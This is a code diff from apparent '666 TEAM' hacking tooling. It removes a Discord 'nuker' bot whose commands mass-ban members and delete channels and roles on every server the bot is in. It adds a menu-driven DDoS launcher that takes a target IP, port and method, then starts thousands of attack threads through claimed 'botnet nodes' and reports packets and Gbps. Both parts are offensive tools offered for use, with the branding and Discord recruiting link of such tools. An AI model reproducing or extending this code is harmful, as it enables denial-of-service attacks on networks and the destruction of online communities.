+        print(f"{BLOOD_RED}[⏱️] DURATION:{END} {WHITE}{duration} SECONDS{END}")
+        print(f"{BLOOD_RED}[🔧] THREADS:{END} {WHITE}{threads:,}{END}")
+        print(f"{BLOOD_RED}[🤖] BOTNET:{END} {WHITE}{self.botnet_size:,} NODES{END}\n")
+        
+        for i in range(int(threads)):
+            node = random.choice(BOTNET_NODES)
+            t = threading.Thread(target=attack_func, args=(ip, int(port), duration, node))
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+        
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            elapsed = int(time.time() - start_time)
+            remaining = duration - elapsed
+            gbps = (self.packets_sent * 65507 * 8) / (1e9 * max(elapsed, 1))
+            print(f"\r{BLOOD_RED}[📊] PACKETS: {self.packets_sent:,} | TIME: {elapsed}/{duration}s | REMAIN: {remaining}s | SPEED: {gbps:.2f} Gbps{END}", end="")
+            time.sleep(1)
+        
+        self.running = False
+        for t in self.threads:
+            t.join(timeout=0)
+        self.threads = []
+        
+        print(f"\n\n{GREEN}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
+        print(f"{GREEN}{BOLD}║                                         ✅ ATTACK COMPLETED - 666 TEAM ✅                                             ║{END}")
+        print(f"{GREEN}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
+        print(f"{GREEN}[📊] TOTAL PACKETS: {self.packets_sent:,}{END}")
+        print(f"{GREEN}[⏱️] TOTAL TIME: {duration} SECONDS{END}")
+        print(f"{GREEN}[📡] AVG SPEED: {self.packets_sent/duration:,.0f} PKT/S{END}\n")
+
+# ============================================
+# COMMAND HANDLER
+# ============================================
+
+def handle_command(cmd, ddos):
+    cmd = cmd.lower().strip()
     
-    elif content.startswith('!nuke-server'):
-        try:
-            parts = content.split()
-            if len(parts) < 2:
-                await message.channel.send("Usage: !nuke-server <number>")
-                return
-            number = int(parts[1])
-            if number < 1 or number > len(bot.guilds):
-                await message.channel.send(f"Invalid! Choose 1-{len(bot.guilds)}")
-                return
-            guild = bot.guilds[number - 1]
-            await message.channel.send(f"💀 666 TEAM NUKING {guild.name}...")
-            results = await nuker.ultimate_nuke(guild)
-            if results:
-                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
-        except:
-            await message.channel.send("Invalid number!")
+    if cmd == '.methods' or cmd == '.m':
+        ddos.print_methods()
+        return True
     
-    elif content == '!nuke':
-        if message.guild:
-            await message.channel.send(f"💀 666 TEAM NUKING {message.guild.name}...")
-            results = await nuker.ultimate_nuke(message.guild)
-            if results:
-                await message.channel.send(f"✅ DESTROYED! Banned: {results['banned']}")
+    elif cmd == '.help' or cmd == '.h':
+        print(f"""
+{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}
+{BLOOD_RED}{BOLD}║                                      💀 666 TEAM ULTIMATE COMMANDS 💀                                                ║{END}
+{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}
+{BLOOD_RED}║  {WHITE}.methods or .m     {BLOOD_RED}- {WHITE}Show all 666 attack methods{END}
+{BLOOD_RED}║  {WHITE}.help or .h        {BLOOD_RED}- {WHITE}Show this help menu{END}
+{BLOOD_RED}║  {WHITE}.clear or .c       {BLOOD_RED}- {WHITE}Clear screen{END}
+{BLOOD_RED}║  {WHITE}.exit or .q        {BLOOD_RED}- {WHITE}Exit the tool{END}
+{BLOOD_RED}║  {WHITE}.stats             {BLOOD_RED}- {WHITE}Show botnet statistics{END}
+{BLOOD_RED}║  {WHITE}.attack            {BLOOD_RED}- {WHITE}Start new attack{END}
+{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}
+""")
+        return True
     
-    elif content == '!nuke-all':
-        await message.channel.send(f"💀 666 TEAM GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
-        total_banned = 0
-        for guild in bot.guilds:
-            results = await nuker.ultimate_nuke(guild)
-            if results:
-                total_banned += results['banned']
-        await message.channel.send(f"✅ COMPLETE! Total Banned: {total_banned}")
+    elif cmd == '.clear' or cmd == '.c':
+        ddos.clear_screen()
+        ddos.print_main_logo()
+        return True
     
-    elif content == '!stats':
-        elapsed = time.time() - nuker.start_time if nuker.start_time else 0
-        hours = int(elapsed // 3600)
-        minutes = int((elapsed % 3600) // 60)
-        await message.channel.send("```")
-        await message.channel.send("╔══════════════════════════════════════════════════════════╗")
-        await message.channel.send("║           666 TEAM NUKER - STATISTICS                     ║")
-        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
-        await message.channel.send(f"║  🎯 SERVERS DESTROYED: {len(nuker.nuked_servers)}")
-        await message.channel.send(f"║  🔨 TOTAL BANNED: {nuker.total_banned:,}")
-        await message.channel.send(f"║  📨 TOTAL DM SENT: {nuker.total_dm_sent:,}")
-        await message.channel.send(f"║  🗑️ CHANNELS DELETED: {nuker.total_channels_deleted:,}")
-        await message.channel.send(f"║  👑 ROLES DELETED: {nuker.total_roles_deleted:,}")
-        await message.channel.send(f"║  💬 SPAM SENT: {nuker.total_spam_sent:,}")
-        await message.channel.send(f"║  ⏱️ UPTIME: {hours}h {minutes}m")
-        await message.channel.send("╠══════════════════════════════════════════════════════════╣")
-        await message.channel.send(f"║  🔗 DISCORD LINK: {DISCORD_LINK}")
-        await message.channel.send("║  💀 666 TEAM - ABSOLUTE POWER 💀")
-        await message.channel.send("╚══════════════════════════════════════════════════════════╝")
-        await message.channel.send("```")
+    elif cmd == '.stats':
+        print(f"""
+{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}
+{BLOOD_RED}{BOLD}║                                      💀 666 TEAM BOTNET STATISTICS 💀                                              ║{END}
+{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}
+{BLOOD_RED}║  {WHITE}🤖 BOTNET NODES:      {BLOOD_RED}- {WHITE}{ddos.botnet_size:,}{END}
+{BLOOD_RED}║  {WHITE}🔧 PROXIES:           {BLOOD_RED}- {WHITE}1,000,000+{END}
+{BLOOD_RED}║  {WHITE}⚡ ATTACK METHODS:    {BLOOD_RED}- {WHITE}666 TOTAL{END}
+{BLOOD_RED}║  {WHITE}👑 MASTER:           {BLOOD_RED}- {WHITE}{CURRENT_USER.upper()}{END}
+{BLOOD_RED}║  {WHITE}📊 PACKETS SENT:     {BLOOD_RED}- {WHITE}{ddos.packets_sent:,}{END}
+{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}
+""")
+        return True
     
-    elif content == '!help':
-        await message.channel.send(f"""
+    elif cmd == '.attack':
+        return False
+    
+    elif cmd == '.exit' or cmd == '.q':
+        print(f"\n{BLOOD_RED}{BOLD}[💀] THANK YOU FOR USING 666 TEAM TOOL!{END}")
+        print(f"{BLOOD_RED}{BOLD}[🔗] JOIN OUR DISCORD: https://discord.gg/k3P8kWQag{END}\n")
+        sys.exit(0)
+    
+    return True
+
+# ============================================
+# MAIN MENU
+# ============================================
+
+def main():
+    if not login_screen():
+        sys.exit(1)
+    
+    ddos = UltimateDDoS()
+    
+    while True:
+        ddos.print_main_logo()
+        
+        print(f"{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
+        print(f"{BLOOD_RED}{BOLD}║                                      💀 ENTER TARGET INFORMATION - 666 TEAM 💀                                     ║{END}")
+        print(f"{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
+        
+        ip = input(f"{BLOOD_RED}║  {WHITE}🌐 TARGET IP: {END}").strip()
+        if not ip:
+            continue
+            
+        port = input(f"{BLOOD_RED}║  {WHITE}🔌 TARGET PORT: {END}").strip()
+        if not port:
+            continue
+            
+        method = input(f"{BLOOD_RED}║  {WHITE}⚡ METHOD (1-666): {END}").strip()
+        if method not in METHODS:
+            print(f"{BLOOD_RED}║  ❌ INVALID METHOD! USE .methods TO SEE ALL{END}")
+            time.sleep(1)
+            continue
+            
+        duration = input(f"{BLOOD_RED}║  {WHITE}⏱️ DURATION (SECONDS): {END}").strip()
+        if not duration.isdigit():
+            print(f"{BLOOD_RED}║  ❌ INVALID DURATION!{END}")
+            time.sleep(1)
+            continue
+            
+        threads = input(f"{BLOOD_RED}║  {WHITE}🔧 THREADS (100-10000): {END}").strip()
+        if not threads.isdigit():
+            threads = "5000"
+        
+        print(f"{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
+        
+        print(f"\n{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
+        print(f"{BLOOD_RED}{BOLD}║                                      💀 ATTACK CONFIRMATION - 666 TEAM 💀                                         ║{END}")
+        print(f"{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
+        print(f"{BLOOD_RED}║  {WHITE}🎯 TARGET: {ip}:{port}")
+        print(f"{BLOOD_RED}║  {WHITE}⚡ METHOD: {METHODS[method]['name']}")
+        print(f"{BLOOD_RED}║  {WHITE}⏱️ DURATION: {duration} SECONDS")
+        print(f"{BLOOD_RED}║  {WHITE}🔧 THREADS: {threads}")
+        print(f"{BLOOD_RED}║  {WHITE}🤖 BOTNET: {ddos.botnet_size:,} NODES")
+        print(f"{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
+        
+        confirm = input(f"\n{BLOOD_RED}{BLINK}[💀] START ATTACK? (y/n): {END}").lower()
+        if confirm == 'y':
+            ddos.start_attack(method, ip, int(port), int(duration), int(threads))
+        else:
+            print(f"{YELLOW}[⏸️] ATTACK CANCELLED!{END}")
+        
+        while True:
+            cmd = input(f"\n{BLOOD_RED}[💀] {WHITE}COMMAND {BLOOD_RED}(.help){WHITE}: {END}").strip()
+            if handle_command(cmd, ddos):
+                break
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{BLOOD_RED}{BOLD}[⚠️] ATTACK STOPPED BY MASTER!{END}\n")
+        print(f"{BLOOD_RED}{BOLD}[💀] 666 TEAM - ALWAYS POWERFUL!{END}\n")
